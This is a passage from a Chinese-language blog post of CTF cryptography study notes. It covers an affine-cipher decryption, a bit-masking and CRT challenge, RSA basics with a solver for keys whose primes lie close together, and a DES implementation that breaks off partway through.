class="line">m = <span class="number">1</span> &lt;&lt; <span class="number">8</span></span><br><span class="line">a = <span class="number">13</span> </span><br><span class="line">b = <span class="number">131</span></span><br><span class="line"><span class="comment"># 计算a的逆元函数</span></span><br><span class="line">a_invert = gmpy2.invert(<span class="number">13</span>,<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a_invert = &#x27;</span>, a_invert)</span><br><span class="line">m = decrypt(c,a_invert,b,m)</span><br><span class="line"><span class="built_in">print</span>(m.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="littleprince-同余方程，中国剩余定理"><a href="#littleprince-同余方程，中国剩余定理" class="headerlink" title="littleprince(同余方程，中国剩余定理)"></a>littleprince(同余方程，中国剩余定理)</h2><p>这道题的给的加密代码有一些难理解，在这里记录一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">a, b, c</span>):</span><br><span class="line">  <span class="comment"># 1 &lt;&lt; b 表示将数字 1 左移 b 位，即得到一个只有第 b 位为1，其余位都为0的整数</span></span><br><span class="line">    <span class="comment"># 例如，如果 b 等于 3，那么 1 &lt;&lt; b 就等于二进制数 0b1000，也就是十进制数 8</span></span><br><span class="line"><span class="comment"># 对结果 1 &lt;&lt; b 减去 1，这样得到的二进制数将会是从第 0 位到第 b-1 位都是1，其余位都是0</span></span><br><span class="line"><span class="comment"># 以 b 等于 3 为例，((1 &lt;&lt; 3) - 1) 将得到二进制数 0b111，也就是十进制数 7</span></span><br><span class="line"><span class="comment"># 最后，我们将 a 和上述得到的结果进行按位与操作 &amp;，这样就会保留 a 的低 b 位，将其余高位都置为0</span></span><br><span class="line">    <span class="comment"># a的低b位的掩码在这里保留a的最后b位置，其他位置设为0</span></span><br><span class="line">    <span class="comment"># 它将这两个结果进行位或操作 | 并将低 c - b 位左移</span></span><br><span class="line">    <span class="comment"># 目的是对a进行加密并且返回</span></span><br><span class="line">    <span class="keyword">return</span> a &gt;&gt; b | (a &amp; ((<span class="number">1</span> &lt;&lt; b)-<span class="number">1</span>)) &lt;&lt; (c-b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">outp</span>(<span class="params">x, h</span>):</span><br><span class="line">    p = randint(<span class="number">1</span> &lt;&lt; h, <span class="number">1</span> &lt;&lt; h+<span class="number">1</span>)</span><br><span class="line">    q = randint(<span class="number">1</span> &lt;&lt; h, <span class="number">1</span> &lt;&lt; h+<span class="number">1</span>)</span><br><span class="line">    c1, c2 = x % p, x % q</span><br><span class="line">    <span class="built_in">print</span>(p, q, c1, c2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag 转成长整数m</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="comment"># 计算m的二进制位数</span></span><br><span class="line">m_len = m.bit_length()</span><br><span class="line">d, h, st = <span class="number">32</span>, <span class="number">16</span>, <span class="number">32</span></span><br><span class="line">r = m_len % d</span><br><span class="line"><span class="keyword">assert</span> (r &gt; h)</span><br><span class="line"><span class="keyword">while</span> st &lt;= m_len:</span><br><span class="line">    <span class="comment"># 对m进行加密</span></span><br><span class="line">    x = enc(m, st, m_len)</span><br><span class="line">    x &gt;&gt;= (m_len-d)</span><br><span class="line">    <span class="comment"># 输出加密结果</span></span><br><span class="line">    outp(x, h)</span><br><span class="line">    st += d</span><br><span class="line"><span class="comment"># 对 m 进行额外的加密操作，并通过 outp 函数输出最终的加密结果</span></span><br><span class="line">m &gt;&gt;= (m_len-r)</span><br><span class="line">outp(m, h)</span><br></pre></td></tr></table></figure><h3 id="掩码"><a href="#掩码" class="headerlink" title="掩码"></a>掩码</h3><blockquote><p>在计算机科学中，”掩码”（Mask）是一个用于屏蔽或提取某些位的二进制模式。掩码通常是一个与目标数据进行按位与操作的值，通过这种操作，可以将目标数据的某些位设置为0或从中提取出感兴趣的位。</p><p>掩码在计算机编程和计算机系统中有广泛的应用，主要用于以下两个方面：</p><ol><li>屏蔽位：掩码可以用于屏蔽目标数据的特定位。通过将目标数据与相应的掩码进行按位与操作，可以将不需要的位设置为0，而保留需要的位。这在编程中常用于清除或保留特定标志位，或者过滤掉数据中不需要的部分。</li><li>提取位：掩码还可以用于从目标数据中提取出感兴趣的位。通过将目标数据与相应的掩码进行按位与操作，可以将目标数据的其他位设置为0，而保留感兴趣的位。这在计算机系统中常用于从寄存器或数据中提取出特定字段或标志位。</li></ol><p>掩码通常使用二进制形式表示，并且每个位都对应于目标数据的相应位。在掩码中，1 表示需要保留或提取的位，0 表示需要屏蔽的位。</p><p>例如，对于目标数据 <code>11010110</code>，如果我们希望屏蔽掉低三位，我们可以使用掩码 <code>11111000</code>，通过进行按位与操作，结果将是 <code>11010000</code>。同样，如果我们希望提取低四位，我们可以使用掩码 <code>00001111</code>，通过进行按位与操作，结果将是 <code>00000110</code>。</p><ul><li>总结：与运算取出感兴趣的位，感兴趣为1，不感兴趣为0</li></ul></blockquote><h3 id="关于移位"><a href="#关于移位" class="headerlink" title="关于移位"></a>关于移位</h3><blockquote><p>a &gt;&gt; b | (a &amp; ((1 &lt;&lt; b)-1)) &lt;&lt; (c-b)</p><p>假设 <code>a</code> 等于 87 （二进制：<code>0b1010111</code>），<code>b</code> 等于 4。</p><ol><li><code>1 &lt;&lt; b</code> 的结果为 <code>0b10000</code>，也就是十进制数 16。</li><li><code>((1 &lt;&lt; b) - 1)</code> 的结果为 <code>0b1111</code>，也就是十进制数 15。</li><li><code>a &amp; ((1 &lt;&lt; b) - 1)</code> 就是 <code>0b1010111 &amp; 0b1111</code>，结果为 <code>0b111</code>，也就是十进制数 7。</li></ol><p>所以，<code>(a &amp; ((1 &lt;&lt; b) - 1))</code> 表达式的结果就是 <code>a</code> 的低 <code>b</code> 位的掩码，它将保留 <code>a</code> 二进制表示中的最后 <code>b</code> 位，并将其他位设置为0。</p></blockquote><h1 id="RSA系列"><a href="#RSA系列" class="headerlink" title="RSA系列"></a>RSA系列</h1><h2 id="RSA原理"><a href="#RSA原理" class="headerlink" title="RSA原理"></a>RSA原理</h2><p>生成数字</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230724151309040.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230724151309040.png"  class="" lazyload></a><p>加密与解密</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230724151346417.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230724151346417.png"  class="" lazyload></a><h2 id="RSA-Py代码实现"><a href="#RSA-Py代码实现" class="headerlink" title="RSA Py代码实现"></a>RSA Py代码实现</h2><p>Python代码的计算过程</p><ol><li><p>导入子库生成两个大素数，512bit朝</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># getPrime函数，它能够返回一个n位的素数</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br></pre></td></tr></table></figure></li><li><p>计算欧拉函数和n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li><li><p>选取e判断互素性，并且计算逆元</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e = 65537</span><br><span class="line">assert GCD(e, phi) == 1, &quot;该e不满足互素条件&quot;</span><br><span class="line">d = inverse(e, phi)</span><br></pre></td></tr></table></figure></li><li><p>加密hello</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里定义的是byte类型的字符串，每个字符用8位的二进制进行存储，如果直接定义字符串hello，字符串类型需要进行编码字节类型才可以进行加密</span></span><br><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line"><span class="comment"># 使用的bytes_to_long函数，将字符串转换为数字</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># 消息已经被转换为一个字符串了，可以加密</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure></li><li><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="keyword">assert</span> GCD(e, phi) == <span class="number">1</span>, <span class="string">&quot;该e不满足互素条件&quot;</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;公钥：(<span class="subst">&#123;e&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;私钥：(<span class="subst">&#123;d&#125;</span>, <span class="subst">&#123;n&#125;</span>)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">b&#x27;hello&#x27;</span></span><br><span class="line">m = bytes_to_long(message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;消息：&#x27;</span>, m)</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;密文：&#x27;</span>, c)</span><br><span class="line"></span><br><span class="line">msg = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;明文：&#x27;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> msg == m, <span class="string">&quot;解密失败&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="RSA类型"><a href="#RSA类型" class="headerlink" title="RSA类型"></a>RSA类型</h2><h3 id="p-q过小差值小类型"><a href="#p-q过小差值小类型" class="headerlink" title="p-q过小差值小类型"></a>p-q过小差值小类型</h3><p>题目代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span></span><br><span class="line"><span class="comment"># 特征</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这里一个特征就是，p通过函数生成512位的素数，然后q为其相邻的下一个素数，可以进行测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line"><span class="built_in">print</span>(q-p)</span><br></pre></td></tr></table></figure><p>解题原理</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230801080504699.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230801080504699.png"  class="" lazyload></a><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n =</span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">sn = gmpy2.isqrt(n)</span><br><span class="line">q = gmpy2.next_prime(sn)</span><br><span class="line">p = n // q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="费马分解"><a href="#费马分解" class="headerlink" title="费马分解"></a>费马分解</h3><h1 id="对称密码系列"><a href="#对称密码系列" class="headerlink" title="对称密码系列"></a>对称密码系列</h1><p>定义：对称加密，称为对称密码,是指在加密和解密时使用同一密钥得加密方式。</p><p>特点：比非对称加密要快</p><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p>典型的块加密，将明文分块加密</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>在DES中，具有如下特点</p><ol><li>输入<code>64</code>位。</li><li>输出<code>64</code>位。</li><li>密钥<code>64</code>位，使用<code>64</code>位密钥中的<code>56</code>位，剩余的<code>8</code>位要么丢弃，要么作为奇偶校验位。</li><li>采用Feistel迭代结构：<ol><li>明文经过 16 轮迭代得到密文。</li><li>密文经过类似的 16 轮迭代得到明文</li></ol></li></ol><h3 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h3><h4 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h4><ul><li>64位明文分组<strong>X</strong>经过一个初始置换函数<code>IP</code>，产生64位的输出<strong>X0</strong>，再将分组<strong><em>X</em>0</strong>分成左半部分<em>L</em>0和右半部分<strong><em>R</em>0</strong>。<ol><li>将输入的第58位换到第一位，第50位换到第2位，…，依次类推。</li><li><em>L</em>0、<em>R</em>0则是换位输出后的两部分， <em>L</em>0是输出的左32位， <em>R</em>0是右32位。</li></ol></li><li>简而言之，这就是打乱了明文之间的排列，我们使用Python来实现这个函数，在这里及后续的代码中，我们都将明文认为是一个数字数组进行操作。</li></ul><h4 id="获取子密钥"><a href="#获取子密钥" class="headerlink" title="获取子密钥"></a>获取子密钥</h4><ul><li>在进入第一轮之前，我们还需要对密钥进行处理生成子密钥，每一轮将使用不同的子密钥参与运算。DES加密算法的密钥长度为56位，一般表示为<code>64</code>位(每个第<code>8</code>位用于奇偶校验)，将用户提供的<code>64</code>位初始密钥经过一系列的处理得到K1,K2,…,K16，分别作为1~16轮运算的16个子密钥。<ol><li>将64位密钥去掉8个校验位，用密钥置换PC-1置换身下的56位密钥</li><li>将56位分成前28位和后28位</li><li>根据轮数，将这两部分别循环左移1位或2位</li><li>移动后，将两部分合成56位后压缩置换PC-2后得到48位子密钥</li></ol></li></ul><h4 id="密码函数F"><a href="#密码函数F" class="headerlink" title="密码函数F"></a>密码函数F</h4><ul><li>密码函数F的作用是将输入的32比特数据和48比特子密钥进行加密输出32比特<br>扩展置换E：将数据的右半部分<code>Ri</code>从32位扩展为48位。位选择函数(也称E盒)。<br>异或：扩展后的48位输出<code>E(Ri)</code>与压缩后的48位密钥Ki作异或运算；<br>S盒替换：将异或得到的48位结果分成八个6位的块，每一块通过对应的一个S盒产生一个4位的输出。<br>P盒置换：将S盒得到的输出再和<code>P</code>盒进行置换操作。</li></ul><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="comment"># operator这个库提供了一组函数，用于执行Python内置运算符的操作。它允许您以函数的形式使用像加法、减法、乘法等运算符，从而使您能够以更灵活的方式操作数据。例如，add()函数允许您将两个数字相加，而不是使用+运算符</span></span><br><span class="line"><span class="comment"># typing提供了在Python中进行类型提示(type hinting)的功能。允许开发者在函数参数、返回值和变量上添加类型注释。</span></span><br><span class="line"><span class="comment"># 这个库提供了一些函数式编程工具，它们可以让您更轻松地处理函数和操作。其中最常用的函数是reduce()，它可以对一个序列中的元素应用某个二元函数，并返回一个最终的聚合结果</span></span><br><span class="line">_IP = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line"><span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line"><span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line"><span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line"><span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,  <span class="number">0</span>,</span><br><span class="line"><span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line"><span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># 这里的plain：List[int]是类型注释，代表plain的参数应该是一个整数列表 但注意，这只是一种提示，并不是强制执行这些类型</span></span><br><span class="line"><span class="comment"># map用于可迭代对象中每个元素给定的函数</span></span><br><span class="line"><span class="comment"># lambda 匿名函数 参数x，返回plain[x]</span></span><br><span class="line"><span class="comment"># 函数功能介绍，将_IP中每个元素作为索引x获取plain[x] </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IP</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: plain[x], _IP))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取子密钥</span></span><br><span class="line"><span class="comment"># 置换56位密钥的pc-1置换表</span></span><br><span class="line">__pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>,  <span class="number">8</span>,</span><br><span class="line">  <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,</span><br><span class="line">  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>,</span><br><span class="line"> <span class="number">18</span>, <span class="number">10</span>,  <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>,</span><br><span class="line"> <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,</span><br><span class="line">  <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>,</span><br><span class="line"> <span class="number">13</span>,  <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>,</span><br><span class="line"> <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># 移动后合并56位压缩置换pc-2置换表</span></span><br><span class="line">__pc2 = [</span><br><span class="line"><span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>,  <span class="number">0</span>,  <span class="number">4</span>,</span><br><span class="line"> <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>,  <span class="number">5</span>, <span class="number">20</span>,  <span class="number">9</span>,</span><br><span class="line"><span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">25</span>,  <span class="number">7</span>,</span><br><span class="line"><span class="number">15</span>,  <span class="number">6</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">1</span>,</span><br><span class="line"><span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>,</span><br><span class="line"><span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>,</span><br><span class="line"><span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">52</span>,</span><br><span class="line"><span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环左移轮数对应于1位或2位</span></span><br><span class="line">ROTATIONS = [<span class="number">1</span>, 